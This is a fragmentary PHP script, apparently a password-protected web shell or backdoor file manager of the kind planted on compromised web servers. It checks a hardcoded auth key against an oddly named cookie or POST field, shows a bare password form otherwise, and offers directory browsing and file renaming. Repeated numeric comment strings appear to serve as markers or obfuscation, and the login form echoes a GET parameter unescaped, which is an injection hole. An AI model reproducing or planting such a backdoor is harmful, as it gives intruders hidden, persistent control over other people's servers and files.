...
$auth_key = "1397a2ce4dc15690cdcde83386b90d1d";
...
$pass = false;
if (isset($_COOKIE['pw_name_88097'])) {
    if(($_COOKIE['pw_name_88097']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_88097'])) {
        if(($_POST['pw_name_88097']) == $auth_key) {
            setcookie("pw_name_88097", $_POST['pw_name_88097']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_88097' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724050127463276 1724050127944180 1724050127350079 1724050127553866
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724050127463276 1724050127944180 1724050127350079 1724050127553866
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724050127463276 1724050127944180 1724050127350079 1724050127553866
            $name = PATH . "/" . $_GET['r'];
